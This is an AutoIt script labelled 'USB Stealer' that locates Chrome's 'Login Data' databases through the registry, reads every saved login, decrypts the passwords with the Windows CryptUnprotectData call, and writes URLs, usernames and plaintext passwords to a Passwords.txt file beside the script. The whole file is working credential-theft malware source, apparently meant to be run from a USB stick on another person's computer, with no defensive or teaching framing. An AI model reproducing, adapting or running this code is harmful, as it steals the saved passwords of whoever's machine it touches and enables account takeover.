#include <Array.au3>
#include <SQLite.au3>
#include <SQLite.dll.au3>
#include <File.au3>

$file = @ScriptDir &"\Passwords.txt"

if FileExists($file) then FileDelete($file)

$file_handle= fileopen($file ,1)

if $file_handle<>-1 Then
FileWrite($file_handle, "Fuat Cem Özyazýcý, USB Stealer - 01.05.2016" & @CRLF & @CRLF & Chrome())
FileFlush($file_handle)
FileClose($file_handle)
endif

Func Chrome()
$mainpath = RegRead('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders', 'Local AppData') & "\Google\Chrome\User Data\"
$filearray = _FileListToArrayRec($mainpath, "*", $FLTAR_FILESFOLDERS, $FLTAR_RECUR, $FLTAR_SORT)

Local $logindataArray[0]
for $z = 0 to UBound($filearray) - 1
  if StringRight($filearray[$z], 10) = "Login Data" Then _ArrayAdd($logindataArray,$filearray[$z])
  next


Local $Query, $Roar, $pwds, $fn
for $z = 0 to UBound($logindataArray) - 1
$fn = $mainpath & $logindataArray[$z]
ConsoleWrite($fn & @CRLF)
if FileExists($fn)=False then
   return ""
   EndIf
_SQLite_Startup()
_SQLite_Open($fn)
_SQLite_Query(-1, "SELECT * FROM logins;", $Query)

While _SQLite_FetchData($Query, $Roar) = $SQLITE_OK
$pwds = $pwds & "URL: "& $Roar[0] & @CRLF &"Username: "& $Roar[3] & @crlf &"Password: "& UncryptRDPPassword($Roar[5]) & @CRLF & @CRLF
WEnd

_SQLite_Close()
_SQLite_Shutdown()
next



Return $pwds

EndFunc
Func UncryptRDPPassword($bin)
Local Const $CRYPTPROTECT_UI_FORBIDDEN = 0x1
Local Const $DATA_BLOB = "int;ptr"
Local $passStr = DllStructCreate("byte[1024]")
Local $DataIn = DllStructCreate($DATA_BLOB)
Local $DataOut = DllStructCreate($DATA_BLOB)
$pwDescription = 'psw'
$PwdHash = ""
DllStructSetData($DataOut, 1, 0)
DllStructSetData($DataOut, 2, 0)
DllStructSetData($passStr, 1, $bin)
DllStructSetData($DataIn, 2, DllStructGetPtr($passStr, 1))
DllStructSetData($DataIn, 1, BinaryLen($bin))
$return = DllCall("crypt32.dll","int", "CryptUnprotectData", _
"ptr", DllStructGetPtr($DataIn), _
"ptr", 0, _
"ptr", 0, _
"ptr", 0, _
"ptr", 0, _
"dword", $CRYPTPROTECT_UI_FORBIDDEN, _
"ptr", DllStructGetPtr($DataOut))
If @error Then Return ""
$len = DllStructGetData($DataOut, 1)
$PwdHash = Ptr(DllStructGetData($DataOut, 2))
$PwdHash = DllStructCreate("byte[" & $len & "]", $PwdHash)
Return BinaryToString(DllStructGetData($PwdHash, 1), 4)
EndFunc